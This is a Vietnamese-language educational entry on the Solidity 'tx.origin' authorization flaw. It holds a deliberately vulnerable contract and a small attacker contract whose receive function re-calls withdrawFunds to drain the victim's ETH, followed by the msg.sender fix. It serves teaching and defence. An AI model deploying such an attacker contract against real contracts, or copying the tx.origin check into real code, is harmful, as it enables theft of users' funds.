# Authorization through `tx.origin`

## Mô tả

Lỗ hổng này xảy ra khi smart contract dùng giá trị `tx.origin` để xác thực. Giá trị này là giá trị của địa chỉ thực hiện giao dịch và nếu smart contract A có gọi thực thi hàm của smart contract B thì smart contract B có thể vượt qua xác thực của smart contract A.

Ví dụ, xét hai smart contract sau:

```sol
contract VictimContract {
  
  address owner;

  constructor() {
    owner = payable(msg.sender);
  }

  function withdrawFunds(address to) public {
    require(tx.origin == owner);
    uint256 contractBalance = address(this).balance;
    (bool suceed, ) = to.call{value: contractBalance}("");
    require(suceed, "Failed withdrawal");
  }
  
}

contract Attacker {
  
  address owner;
  VictimContract victim;
  
  constructor(VictimContract _victim) {
    owner = payable(msg.sender);
    victim = VictimContract(_victim);
  }
  
  receive() external payable {
    victim.withdrawFunds(owner);
  }
  
}
```

Smart contract `VictimContract` cho phép chủ sở hữu rút ETH thông qua hàm `withdrawFunds` bằng cách dùng hàm `call` để gửi ETH cho địa chỉ `to`. Hàm này thực hiện xác thực bằng cách so sánh `tx.origin` với địa chỉ của chủ sở hữu. 

Để nhận ETH, smart contract `Attacker` đã cài đặt hàm `receive`. Tuy nhiên, hàm này thực hiện gọi lại hàm `withdrawFunds` của `VictimContract` với đối số là `owner` của `Attacker`.

Kẻ tấn công sẽ tìm cách dụ chủ sở hữu của smart contract chuyển ETH cho `Attacker`. Khi đó, `tx.origin` sẽ có giá trị là `owner` và việc gọi lại hàm `withdrawFunds` của `Attacker` sẽ thỏa điều kiện xác thực `tx.origin == owner`.

## Cách khắc phục

Sử dụng `msg.sender` thay vì `tx.origin` để xác thực.
